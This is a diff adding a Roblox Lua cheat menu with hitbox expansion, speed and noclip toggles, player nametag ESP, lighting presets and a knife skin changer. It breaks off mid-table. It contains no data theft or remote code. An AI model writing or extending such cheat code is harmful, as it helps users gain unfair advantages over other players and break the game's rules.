@@ -1,0 +1,1373 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+
+local player = Players.LocalPlayer
+
+local udhl_settings = {
+    HeadSize = 20,
+    Disabled = false,
+    Transparency = 0.7,
+    Protection = true,
+    SpeedMaster = false,
+    SpeedActive = false,
+    SpeedKey = Enum.KeyCode.X,
+    SpeedValue = 50,
+    CFrameSpeed = false,
+    CFrameSpeedKey = Enum.KeyCode.V,
+    Noclip = false,
+    TracersESP = false,
+    Box2DESP = false,
+    NametagsESP = false
+}
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "UDHL_GUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 300, 0, 350)
+mainFrame.Position = UDim2.new(0, 10, 0, 10)
+mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+-- Cinnamoroll theme: white body with soft blue accents.
+mainFrame.BackgroundTransparency = 0
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 8)
+mainCorner.Parent = mainFrame
+
+-- Floating draggable button to hide/show the full menu.
+local menuToggle = Instance.new("TextButton")
+menuToggle.Name = "FloatingMenuToggle"
+menuToggle.Size = UDim2.new(0, 76, 0, 34)
+menuToggle.Position = UDim2.new(0, 18, 0, 370)
+menuToggle.BackgroundColor3 = Color3.fromRGB(45, 145, 225)
+menuToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+menuToggle.Text = "UDHL • MENU"
+menuToggle.TextSize = 11
+menuToggle.Font = Enum.Font.GothamBold
+menuToggle.BorderSizePixel = 0
+menuToggle.ZIndex = 100
+menuToggle.Parent = screenGui
+local menuToggleCorner = Instance.new("UICorner")
+menuToggleCorner.CornerRadius = UDim.new(0, 9)
+menuToggleCorner.Parent = menuToggle
+
+-- Lock button copied in spirit from the MM2 reference: unlocked = movable, locked = fixed.
+local toggleLocked = false
+local toggleMoved = false
+local toggleLock = Instance.new("TextButton")
+toggleLock.Name = "FloatingButtonLock"
+toggleLock.Size = UDim2.new(0, 30, 0, 34)
+toggleLock.Position = UDim2.new(0, 98, 0, 370)
+toggleLock.BackgroundColor3 = Color3.fromRGB(45, 145, 225)
+toggleLock.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleLock.Text = "🔓"
+toggleLock.TextSize = 17
+toggleLock.Font = Enum.Font.GothamBold
+toggleLock.BorderSizePixel = 0
+toggleLock.ZIndex = 100
+toggleLock.Parent = screenGui
+local toggleLockCorner = Instance.new("UICorner")
+toggleLockCorner.CornerRadius = UDim.new(0, 9)
+toggleLockCorner.Parent = toggleLock
+
+local function syncToggleLockPosition()
+    toggleLock.Position = UDim2.new(menuToggle.Position.X.Scale, menuToggle.Position.X.Offset + menuToggle.AbsoluteSize.X + 4,
+        menuToggle.Position.Y.Scale, menuToggle.Position.Y.Offset)
+end
+syncToggleLockPosition()
+toggleLock.MouseButton1Click:Connect(function()
+    toggleLocked = not toggleLocked
+    toggleLock.Text = toggleLocked and "🔒" or "🔓"
+    toggleLock.BackgroundColor3 = toggleLocked and Color3.fromRGB(25, 105, 190) or Color3.fromRGB(45, 145, 225)
+end)
+
+menuToggle.MouseButton1Click:Connect(function()
+    if toggleMoved then
+        toggleMoved = false
+        return
+    end
+    mainFrame.Visible = not mainFrame.Visible
+end)
+
+local toggleDragging = false
+local toggleDragStart, toggleStartPosition, toggleDragInput
+menuToggle.InputBegan:Connect(function(input)
+    if toggleLocked then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        toggleDragging = true
+        toggleMoved = false
+        toggleDragStart = input.Position
+        toggleStartPosition = menuToggle.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then toggleDragging = false end
+        end)
+    end
+end)
+menuToggle.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        toggleDragInput = input
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if toggleDragging and not toggleLocked and input == toggleDragInput then
+        local delta = input.Position - toggleDragStart
+        if math.abs(delta.X) > 4 or math.abs(delta.Y) > 4 then toggleMoved = true end
+        menuToggle.Position = UDim2.new(
+            toggleStartPosition.X.Scale, toggleStartPosition.X.Offset + delta.X,
+            toggleStartPosition.Y.Scale, toggleStartPosition.Y.Offset + delta.Y
+        )
+        syncToggleLockPosition()
+    end
+end)
+
+-- Background image requested by user
+local backgroundImage = Instance.new("ImageLabel")
+backgroundImage.Name = "MenuBackground"
+backgroundImage.Size = UDim2.new(1, 0, 1, 0)
+backgroundImage.Position = UDim2.new(0, 0, 0, 0)
+backgroundImage.BackgroundTransparency = 1
+backgroundImage.Image = "https://raw.githubusercontent.com/gimno155-source/lua/refs/heads/main/IMG_0474.jpeg"
+backgroundImage.ScaleType = Enum.ScaleType.Crop
+backgroundImage.ImageTransparency = 0.72
+backgroundImage.Visible = true
+backgroundImage.ZIndex = 1
+backgroundImage.Parent = mainFrame
+
+local backgroundCorner = Instance.new("UICorner")
+backgroundCorner.CornerRadius = UDim.new(0, 8)
+backgroundCorner.Parent = backgroundImage
+
+-- Decorative icon at the bottom-right, matching the reference script.
+local bottomIcon = Instance.new("ImageLabel")
+bottomIcon.Name = "BottomCinnamorollIcon"
+bottomIcon.Size = UDim2.new(0, 55, 0, 55)
+bottomIcon.Position = UDim2.new(1, -65, 1, -50)
+bottomIcon.BackgroundTransparency = 1
+bottomIcon.Image = "rbxassetid://9849752871"
+bottomIcon.ScaleType = Enum.ScaleType.Fit
+bottomIcon.ImageTransparency = 0
+bottomIcon.ZIndex = 90
+bottomIcon.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundColor3 = Color3.fromRGB(220, 238, 248)
+title.BackgroundTransparency = 0
+title.BorderSizePixel = 0
+title.Text = "hitbox from hailey"
+title.TextColor3 = Color3.fromRGB(35, 45, 55)
+title.TextSize = 18
+title.Font = Enum.Font.GothamBold
+title.ZIndex = 5
+ title.Parent = mainFrame
+
+-- Small Cinnamoroll icon in the header, matching the reference UI.
+local topIcon = Instance.new("ImageLabel")
+topIcon.Name = "CinnamorollHeaderIcon"
+topIcon.Size = UDim2.new(0, 22, 0, 22)
+topIcon.Position = UDim2.new(0, 10, 0, 4)
+topIcon.BackgroundTransparency = 1
+topIcon.Image = "rbxassetid://81412927404972"
+topIcon.ScaleType = Enum.ScaleType.Fit
+topIcon.ZIndex = 10
+topIcon.Parent = mainFrame
+
+local titlePadding = Instance.new("UIPadding")
+titlePadding.PaddingLeft = UDim.new(0, 38)
+titlePadding.Parent = title
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 8)
+titleCorner.Parent = title
+
+local TAB_BLUE = Color3.fromRGB(45, 145, 225)
+local TAB_BLUE_ACTIVE = Color3.fromRGB(25, 105, 190)
+
+local categoriesFrame = Instance.new("Frame")
+categoriesFrame.Size = UDim2.new(1, -20, 0, 30)
+categoriesFrame.Position = UDim2.new(0, 10, 0, 45)
+categoriesFrame.BackgroundTransparency = 1
+categoriesFrame.ZIndex = 3
+categoriesFrame.Parent = mainFrame
+
+local categories = {"Hitbox", "Cframe", "Users", "Color", "Guns"}
+local categoryButtons = {}
+local currentCategory = "Hitbox"
+
+local contentBacking = Instance.new("Frame")
+contentBacking.Name = "ContentReadabilityBacking"
+contentBacking.Size = UDim2.new(1, -16, 1, -88)
+contentBacking.Position = UDim2.new(0, 8, 0, 78)
+contentBacking.BackgroundColor3 = Color3.fromRGB(245, 250, 252)
+contentBacking.BackgroundTransparency = 0.18
+contentBacking.BorderSizePixel = 0
+contentBacking.ZIndex = 2
+contentBacking.Parent = mainFrame
+local contentBackingCorner = Instance.new("UICorner")
+contentBackingCorner.CornerRadius = UDim.new(0, 7)
+contentBackingCorner.Parent = contentBacking
+
+local contentFrame = Instance.new("Frame")
+contentFrame.Size = UDim2.new(1, -20, 1, -85)
+contentFrame.Position = UDim2.new(0, 10, 0, 80)
+contentFrame.BackgroundTransparency = 1
+contentFrame.ZIndex = 3
+contentFrame.Parent = mainFrame
+
+local function styleButton(button, color)
+    button.BackgroundColor3 = color or Color3.fromRGB(245, 250, 252)
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextSize = 12
+    button.Font = Enum.Font.GothamSemibold
+    button.BorderSizePixel = 0
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = button
+end
+
+local function makeLabel(parent, text, position, size)
+    local label = Instance.new("TextLabel")
+    label.Size = size or UDim2.new(1, 0, 0, 30)
+    label.Position = position or UDim2.new()
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(25, 35, 45)
+    label.TextSize = 14
+    label.Font = Enum.Font.Gotham
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.ZIndex = 3
+    label.Parent = parent
+    return label
+end
+
+local function makeToggle(parent, text, position, initial, callback)
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(1, 0, 0, 32)
+    button.Position = position
+    button.ZIndex = 3
+    button.TextSize = 13
+    button.Font = Enum.Font.GothamBold
+    button.TextColor3 = Color3.fromRGB(25, 35, 45)
+    button.BorderSizePixel = 0
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = button
+    local state = initial
+    local function refresh()
+        button.Text = text .. (state and ": ON" or ": OFF")
+        button.BackgroundColor3 = state and Color3.fromRGB(145, 210, 240) or Color3.fromRGB(220, 238, 248)
+    end
+    refresh()
+    button.Parent = parent
+    button.MouseButton1Click:Connect(function()
+        state = not state
+        refresh()
+        callback(state)
+    end)
+    return button
+end
+
+local function makeInput(parent, labelText, value, y, callback)
+    makeLabel(parent, labelText, UDim2.new(0, 0, 0, y), UDim2.new(0.6, 0, 0, 30))
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(0.35, 0, 0, 27)
+    box.Position = UDim2.new(0.65, 0, 0, y + 1)
+    box.BackgroundColor3 = Color3.fromRGB(245, 250, 252)
+    box.BackgroundTransparency = 0.1
+    box.Text = tostring(value)
+    box.TextColor3 = Color3.fromRGB(25, 35, 45)
+    box.PlaceholderText = labelText
+    box.PlaceholderColor3 = Color3.fromRGB(90, 100, 110)
+    box.TextSize = 14
+    box.Font = Enum.Font.Gotham
+    box.ClearTextOnFocus = false
+    box.ZIndex = 3
+    box.Parent = parent
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 4)
+    corner.Parent = box
+    box.FocusLost:Connect(function()
+        local number = tonumber(box.Text)
+        if number then
+            callback(number)
+            box.Text = tostring(number)
+        else
+            box.Text = tostring(value)
+        end
+    end)
+    return box
+end
+
+local function clearContent()
+    for _, child in ipairs(contentFrame:GetChildren()) do
+        child:Destroy()
+    end
+end
+
+local function buildHitbox()
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundTransparency = 1
+    frame.ZIndex = 2
+    frame.Parent = contentFrame
+
+    makeInput(frame, "Hitbox size", udhl_settings.HeadSize, 0, function(n)
+        if n > 0 and n <= 100 then udhl_settings.HeadSize = n end
+    end)
+    makeInput(frame, "Transparency (0-1)", udhl_settings.Transparency, 38, function(n)
+        if n >= 0 and n <= 1 then udhl_settings.Transparency = n end
+    end)
+
+    makeToggle(frame, "HITBOX", UDim2.new(0, 0, 0, 82), not udhl_settings.Disabled, function(on)
+        udhl_settings.Disabled = not on
+    end)
+    makeToggle(frame, "PROTECTION", UDim2.new(0, 0, 0, 122), udhl_settings.Protection, function(on)
+        udhl_settings.Protection = on
+    end)
+
+    makeToggle(frame, "FLOATING BUTTON", UDim2.new(0, 0, 0, 162), menuToggle.Visible, function(on)
+        menuToggle.Visible = on
+        toggleLock.Visible = on
+    end)
+    makeLabel(frame, "Use the lock beside the floating button to freeze or unlock its position.",
+        UDim2.new(0, 0, 0, 202), UDim2.new(1, 0, 0, 44))
+end
+
+local speedKeyCaptureButton
+local waitingForSpeedKey = false
+local cframeKeyCaptureButton
+local waitingForCFrameKey = false
+
+local function buildMovement()
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundTransparency = 1
+    frame.ZIndex = 2
+    frame.Parent = contentFrame
+
+    makeInput(frame, "Speed Value", udhl_settings.SpeedValue, 0, function(n)
+        if n >= 16 and n <= 1000 then udhl_settings.SpeedValue = n end
+    end)
+
+    makeToggle(frame, "SPEED MASTER", UDim2.new(0, 0, 0, 42), udhl_settings.SpeedMaster, function(on)
+        udhl_settings.SpeedMaster = on
+        if not on then
+            udhl_settings.SpeedActive = false
+        else
+            pcall(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "Speed Master",
+                    Text = "Press the selected Speed Key to toggle speed.",
+                    Duration = 3
+                })
+            end)
+        end
+    end)
+
+    makeToggle(frame, "OLD CFRAME", UDim2.new(0, 0, 0, 82), udhl_settings.CFrameSpeed, function(on)
+        udhl_settings.CFrameSpeed = on
+    end)
+
+    makeLabel(frame, "Speed Key", UDim2.new(0, 0, 0, 124), UDim2.new(0.54, 0, 0, 30))
+    speedKeyCaptureButton = Instance.new("TextButton")
+    speedKeyCaptureButton.Name = "SpeedKeybind"
+    speedKeyCaptureButton.Size = UDim2.new(0.42, 0, 0, 28)
+    speedKeyCaptureButton.Position = UDim2.new(0.58, 0, 0, 125)
+    speedKeyCaptureButton.Text = udhl_settings.SpeedKey.Name
+    speedKeyCaptureButton.ZIndex = 4
+    styleButton(speedKeyCaptureButton, TAB_BLUE)
+    speedKeyCaptureButton.Parent = frame
+    speedKeyCaptureButton.MouseButton1Click:Connect(function()
+        waitingForSpeedKey = true
+        speedKeyCaptureButton.Text = "Press key..."
+    end)
+
+    makeLabel(frame, "CFrame Key", UDim2.new(0, 0, 0, 164), UDim2.new(0.54, 0, 0, 30))
+    cframeKeyCaptureButton = Instance.new("TextButton")
+    cframeKeyCaptureButton.Name = "CFrameKeybind"
+    cframeKeyCaptureButton.Size = UDim2.new(0.42, 0, 0, 28)
+    cframeKeyCaptureButton.Position = UDim2.new(0.58, 0, 0, 165)
+    cframeKeyCaptureButton.Text = udhl_settings.CFrameSpeedKey.Name
+    cframeKeyCaptureButton.ZIndex = 4
+    styleButton(cframeKeyCaptureButton, TAB_BLUE)
+    cframeKeyCaptureButton.Parent = frame
+    cframeKeyCaptureButton.MouseButton1Click:Connect(function()
+        waitingForCFrameKey = true
+        cframeKeyCaptureButton.Text = "Press key..."
+    end)
+
+    makeToggle(frame, "NOCLIP", UDim2.new(0, 0, 0, 204), udhl_settings.Noclip, function(on)
+        udhl_settings.Noclip = on
+    end)
+    makeLabel(frame, "Speed Master uses WalkSpeed. OLD CFRAME uses the previous movement method.",
+        UDim2.new(0, 0, 0, 246), UDim2.new(1, 0, 0, 38))
+end
+
+-- Functional NameTags ESP: creates a BillboardGui above every other player's character.
+local NAMETAG_GUI_NAME = "UDHL_NameTag"
+local nametagEnabled = false
+local nametagPlayerConnections = {}
+local nametagAddedConnection = nil
+local nametagRemovingConnection = nil
+
+local function removeNametag(character)
+    if not character then return end
+    local existing = character:FindFirstChild(NAMETAG_GUI_NAME)
+    if existing then existing:Destroy() end
+end
+
+local function addNametag(targetPlayer)
+    if not nametagEnabled or targetPlayer == player then return end
+    local character = targetPlayer.Character
+    if not character then return end
+    local adornee = character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
+    if not adornee or not adornee:IsA("BasePart") then return end
+
+    removeNametag(character)
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = NAMETAG_GUI_NAME
+    billboard.Adornee = adornee
+    billboard.AlwaysOnTop = true
+    billboard.LightInfluence = 0
+    billboard.MaxDistance = 10000
+    billboard.Size = UDim2.new(0, 220, 0, 42)
+    billboard.StudsOffset = Vector3.new(0, 2.8, 0)
+    billboard.Parent = character
+
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Name = "NameText"
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Size = UDim2.new(1, 0, 1, 0)
+    nameLabel.Position = UDim2.new(0, 0, 0, 0)
+    nameLabel.Font = Enum.Font.GothamBold
+    nameLabel.Text = targetPlayer.DisplayName .. "  (@" .. targetPlayer.Name .. ")"
+    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    nameLabel.TextStrokeColor3 = Color3.fromRGB(20, 35, 55)
+    nameLabel.TextStrokeTransparency = 0.15
+    nameLabel.TextSize = 14
+    nameLabel.TextScaled = false
+    nameLabel.TextWrapped = true
+    nameLabel.Parent = billboard
+end
+
+local function setNametagsEnabled(enabled)
+    nametagEnabled = enabled
+    if enabled then
+        for _, targetPlayer in ipairs(Players:GetPlayers()) do
+            addNametag(targetPlayer)
+            if targetPlayer ~= player and not nametagPlayerConnections[targetPlayer] then
+                nametagPlayerConnections[targetPlayer] = targetPlayer.CharacterAdded:Connect(function(character)
+                    task.wait(0.5)
+                    if nametagEnabled then addNametag(targetPlayer) end
+                end)
+            end
+        end
+        if not nametagAddedConnection then
+            nametagAddedConnection = Players.PlayerAdded:Connect(function(targetPlayer)
+                if targetPlayer == player then return end
+                nametagPlayerConnections[targetPlayer] = targetPlayer.CharacterAdded:Connect(function()
+                    task.wait(0.5)
+                    if nametagEnabled then addNametag(targetPlayer) end
+                end)
+                task.defer(function() addNametag(targetPlayer) end)
+            end)
+        end
+        if not nametagRemovingConnection then
+            nametagRemovingConnection = Players.PlayerRemoving:Connect(function(targetPlayer)
+                if targetPlayer.Character then removeNametag(targetPlayer.Character) end
+                local connection = nametagPlayerConnections[targetPlayer]
+                if connection then connection:Disconnect() end
+                nametagPlayerConnections[targetPlayer] = nil
+            end)
+        end
+    else
+        for _, targetPlayer in ipairs(Players:GetPlayers()) do
+            if targetPlayer.Character then removeNametag(targetPlayer.Character) end
+        end
+        for targetPlayer, connection in pairs(nametagPlayerConnections) do
+            connection:Disconnect()
+            nametagPlayerConnections[targetPlayer] = nil
+        end
+    end
+end
+
+local function buildUsers()
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundTransparency = 1
+    frame.ZIndex = 2
+    frame.Parent = contentFrame
+
+    makeToggle(frame, "TRACERS ESP", UDim2.new(0, 0, 0, 0), udhl_settings.TracersESP, function(on)
+        udhl_settings.TracersESP = on
+    end)
+    makeToggle(frame, "2D BOX ESP", UDim2.new(0, 0, 0, 40), udhl_settings.Box2DESP, function(on)
+        udhl_settings.Box2DESP = on
+    end)
+    makeToggle(frame, "NAMETAGS ESP", UDim2.new(0, 0, 0, 80), udhl_settings.NametagsESP, function(on)
+        udhl_settings.NametagsESP = on
+        setNametagsEnabled(on)
+    end)
+    makeLabel(frame, "Name tags appear above other players. Tracers and 2D boxes are not implemented in this version.", UDim2.new(0, 0, 0, 125), UDim2.new(1, 0, 0, 55))
+end
+
+local function buildColor()
+    local scroll = Instance.new("ScrollingFrame")
+    scroll.Name = "AtmospherePresets"
+    scroll.Size = UDim2.new(1, 0, 1, 0)
+    scroll.CanvasSize = UDim2.new(0, 0, 0, 390)
+    scroll.ScrollBarThickness = 5
+    scroll.BackgroundTransparency = 1
+    scroll.BorderSizePixel = 0
+    scroll.ZIndex = 3
+    scroll.Parent = contentFrame
+
+    local originalLighting = {
+        FogStart = Lighting.FogStart,
+        FogEnd = Lighting.FogEnd,
+        FogColor = Lighting.FogColor
+    }
+
+    -- Presets copied from the Atmosphere section of pwd2 lock.txt.
+    local fogPresets = {
+        {"Red", Color3.fromRGB(255, 60, 60), 0.45},
+        {"Light Red", Color3.fromRGB(255, 120, 120), 0.44},
+        {"Dark Red", Color3.fromRGB(180, 20, 20), 0.48},
+        {"Orange", Color3.fromRGB(255, 140, 0), 0.43},
+        {"Light Orange", Color3.fromRGB(255, 190, 80), 0.42},
+        {"Dark Orange", Color3.fromRGB(200, 90, 0), 0.46},
+        {"Yellow", Color3.fromRGB(255, 240, 60), 0.41},
+        {"Lime", Color3.fromRGB(140, 255, 60), 0.45},
+        {"Green", Color3.fromRGB(50, 255, 50), 0.49},
+        {"Cyan", Color3.fromRGB(60, 255, 220), 0.47},
+        {"Electric Blue", Color3.fromRGB(0, 255, 255), 0.51},
+        {"Blue", Color3.fromRGB(60, 140, 255), 0.50},
+        {"Purple", Color3.fromRGB(180, 60, 255), 0.52},
+        {"Violet", Color3.fromRGB(138, 43, 226), 0.56},
+        {"Pink", Color3.fromRGB(255, 100, 200), 0.48},
+        {"Hot Pink", Color3.fromRGB(255, 20, 147), 0.49}
+    }
+
+    local resetButton = Instance.new("TextButton")
+    resetButton.Size = UDim2.new(1, -4, 0, 30)
+    resetButton.Position = UDim2.new(0, 2, 0, 0)
+    resetButton.Text = "Reset Lighting"
+    resetButton.ZIndex = 4
+    styleButton(resetButton, TAB_BLUE_ACTIVE)
+    resetButton.Parent = scroll
+    resetButton.MouseButton1Click:Connect(function()
+        for _, item in ipairs(Lighting:GetChildren()) do
+            if item:IsA("Atmosphere") then item:Destroy() end
+        end
+        Lighting.FogStart = originalLighting.FogStart
+        Lighting.FogEnd = originalLighting.FogEnd
+        Lighting.FogColor = originalLighting.FogColor
+    end)
+
+    for i, preset in ipairs(fogPresets) do
+        local button = Instance.new("TextButton")
+        button.Size = UDim2.new(0.5, -5, 0, 29)
+        local col = (i - 1) % 2
+        local row = math.floor((i - 1) / 2)
+        button.Position = UDim2.new(col * 0.5, col == 0 and 2 or 3, 0, 35 + row * 32)
+        button.Text = preset[1]
+        button.ZIndex = 4
+        styleButton(button, TAB_BLUE)
+        button.Parent = scroll
+        button.MouseButton1Click:Connect(function()
+            for _, item in ipairs(Lighting:GetChildren()) do
+                if item:IsA("Atmosphere") then item:Destroy() end
+            end
+            local atmosphere = Instance.new("Atmosphere")
+            atmosphere.Color = preset[2]
+            atmosphere.Density = preset[3]
+            atmosphere.Haze = 4
+            atmosphere.Parent = Lighting
+            Lighting.FogStart = 30
+            Lighting.FogEnd = 200
+        end)
+    end
+
+    local correctionToggle = Instance.new("TextButton")
+    correctionToggle.Size = UDim2.new(1, -4, 0, 30)
+    correctionToggle.Position = UDim2.new(0, 2, 0, 35 + math.ceil(#fogPresets / 2) * 32)
+    correctionToggle.ZIndex = 4
+    styleButton(correctionToggle, TAB_BLUE_ACTIVE)
+    correctionToggle.Parent = scroll
+    local correctionEnabled = false
+    local function refreshCorrectionLabel()
+        correctionToggle.Text = "Color Correction: " .. (correctionEnabled and "ON" or "OFF")
+    end
+    refreshCorrectionLabel()
+    correctionToggle.MouseButton1Click:Connect(function()
+        correctionEnabled = not correctionEnabled
+        local effect = Lighting:FindFirstChild("ValColorEffect")
+        if correctionEnabled then
+            if not effect then effect = Instance.new("ColorCorrectionEffect") end
+            effect.Name = "ValColorEffect"
+            effect.Enabled = true
+            effect.Saturation = 0.5
+            effect.Contrast = 0
+            effect.Brightness = 0
+            effect.TintColor = Color3.fromRGB(255, 255, 255)
+            effect.Parent = Lighting
+        elseif effect then
+            effect.Enabled = false
+        end
+        refreshCorrectionLabel()
+    end)
+
+    makeLabel(scroll, "Saturation (0–2)", UDim2.new(0, 2, 0, 35 + math.ceil(#fogPresets / 2) * 32 + 36), UDim2.new(0.55, 0, 0, 26))
+    local saturationBox = Instance.new("TextBox")
+    saturationBox.Size = UDim2.new(0.4, 0, 0, 26)
+    saturationBox.Position = UDim2.new(0.58, 0, 0, 35 + math.ceil(#fogPresets / 2) * 32 + 36)
+    saturationBox.Text = "0.5"
+    saturationBox.PlaceholderText = "0–2"
+    saturationBox.TextColor3 = Color3.fromRGB(25, 35, 45)
+    saturationBox.BackgroundColor3 = Color3.fromRGB(245, 250, 252)
+    saturationBox.TextSize = 13
+    saturationBox.Font = Enum.Font.Gotham
+    saturationBox.ClearTextOnFocus = false
+    saturationBox.ZIndex = 4
+    saturationBox.Parent = scroll
+    local satCorner = Instance.new("UICorner")
+    satCorner.CornerRadius = UDim.new(0, 5)
+    satCorner.Parent = saturationBox
+    saturationBox.FocusLost:Connect(function()
+        local value = tonumber(saturationBox.Text)
+        if not value then saturationBox.Text = "0.5"; return end
+        value = math.clamp(value, 0, 2)
+        saturationBox.Text = tostring(value)
+        local effect = Lighting:FindFirstChild("ValColorEffect")
+        if not effect then effect = Instance.new("ColorCorrectionEffect"); effect.Name = "ValColorEffect"; effect.Parent = Lighting end
+        effect.Enabled = true
+        effect.Saturation = value
+        effect.Contrast = 0
+        effect.Brightness = 0
+        effect.TintColor = Color3.fromRGB(255, 255, 255)
+        correctionEnabled = true
+        refreshCorrectionLabel()
+    end)
+    scroll.CanvasSize = UDim2.new(0, 0, 0, 35 + math.ceil(#fogPresets / 2) * 32 + 100)
+end
+
+shared.Glory = shared.Glory or {}
+shared.Glory.skins = shared.Glory.skins or {}
+shared.Glory.skins.enabled = true
+shared.Glory.skins.weapons = shared.Glory.skins.weapons or {}
+
+local cfg = shared.Glory
+local knifeData = {}
+local toolRegistry = {}
+local gunOriginals = {}
+local currentSelection = nil
+
+local gloryKnifeSkins = {
+    ["Golden Age Tanto"] = {soundid="rbxassetid://5917819099", animationid="rbxassetid://13473404819", positionoffset=Vector3.new(0,-0.20,-1.2), rotationoffset=Vector3.new(90,263.7,180)},
+    ["GPO-Knife"] = {soundid="rbxassetid://4604390759", animationid="rbxassetid://14014278925", positionoffset=Vector3.new(0,-0.32,-1.07), rotationoffset=Vector3.new(90,-97.4,90)},
+    ["GPO-Knife Prestige"] = {soundid="rbxassetid://4604390759", animationid="rbxassetid://14014278925", positionoffset=Vector3.new(0,-0.32,-1.07), rotationoffset=Vector3.new(90,-97.4,90)},
+    ["Heaven"] = {soundid="rbxassetid://14489860007", animationid="rbxassetid://14500266726", positionoffset=Vector3.new(-0.02,-0.82,0.20), rotationoffset=Vector3.new(64.42,3.79,0)},
+    ["Love Kukri"] = {soundid="", animationid="", positionoffset=Vector3.new(-0.14,0.14,-1.62), rotationoffset=Vector3.new(-90,180,-4.97), particle=true, textureid="rbxassetid://12124159284"},
+    ["Purple Dagger"] = {soundid="rbxassetid://17822743153", animationid="rbxassetid://17824999722", positionoffset=Vector3.new(-0.13,-0.24,-1.80), rotationoffset=Vector3.new(89.05,96.63,180)},
+    ["Blue Dagger"] = {soundid="rbxassetid://17822737046", animationid="rbxassetid://17824995184", positionoffset=Vector3.new(-0.13,-0.24,-1.80), rotationoffset=Vector3.new(89.05,96.63,180)},
+    ["Green Dagger"] = {soundid="rbxassetid://17822741762", animationid="rbxassetid://17825004320", positionoffset=Vector3.new(-0.13,-0.24,-1.07), rotationoffset=Vector3.new(89.05,96.63,180)},
+    ["Red Dagger"] = {soundid="rbxassetid://17822952417", animationid="rbxassetid://17825008844", positionoffset=Vector3.new(-0.13,-0.24,-1.07), rotationoffset=Vector3.new(89.05,96.63,180)},
+    ["Portal"] = {soundid="rbxassetid://16058846352", animationid="rbxassetid://16058633881", positionoffset=Vector3.new(-0.13,-0.35,-0.57), rotationoffset=Vector3.new(89.05,96.63,180)},
+    ["Emerald Butterfly"] = {soundid="rbxassetid://14931902491", animationid="rbxassetid://14918231706", positionoffset=Vector3.new(-0.02,-0.30,-0.65), rotationoffset=Vector3.new(180,90.95,180)},
+    ["Boy"] = {soundid="rbxassetid://18765078331", animationid="rbxassetid://18789158908", positionoffset=Vector3.new(-0.02,-0.09,-0.73), rotationoffset=Vector3.new(89.05,-88.11,180)},
+    ["Girl"] = {soundid="rbxassetid://18765078331", animationid="rbxassetid://18789162944", positionoffset=Vector3.new(-0.02,-0.16,-0.73), rotationoffset=Vector3.new(89.05,-88.11,180)},
+    ["Dragon"] = {soundid="rbxassetid://14217789230", animationid="rbxassetid://14217804400", positionoffset=Vector3.new(-0.02,-0.32,-0.98), rotationoffset=Vector3.new(89.05,90.95,180)},
+    ["Void"] = {soundid="rbxassetid://14756591763", animationid="rbxassetid://14774699952", positionoffset=Vector3.new(-0.02,-0.22,-0.85), rotationoffset=Vector3.new(180,90.95,180)},
+    ["Wild West"] = {soundid="rbxassetid://16058689026", animationid="rbxassetid://16058148839", positionoffset=Vector3.new(-0.02,-0.24,-1.15), rotationoffset=Vector3.new(-91.89,90.95,180)},
+    ["Iced Out"] = {soundid="rbxassetid://14924261405", animationid="rbxassetid://18465353361", positionoffset=Vector3.new(0.02,-0.08,0.99), rotationoffset=Vector3.new(180,-90.95,-180)},
+    ["Reptile"] = {soundid="rbxassetid://18765103349", animationid="rbxassetid://18788955930", positionoffset=Vector3.new(-0.03,-0.06,-0.92), rotationoffset=Vector3.new(168.63,90,-180)},
+    ["Emerald"] = {soundid="", animationid="", positionoffset=Vector3.new(-0.03,-0.06,-0.92), rotationoffset=Vector3.new(168.63,90,108)},
+    ["Ribbon"] = {soundid="rbxassetid://130974579277249", animationid="rbxassetid://124102609796063", positionoffset=Vector3.new(0.02,-0.25,-0.05), rotationoffset=Vector3.new(90,0,180)},
+}
+
+local skinCategories = {
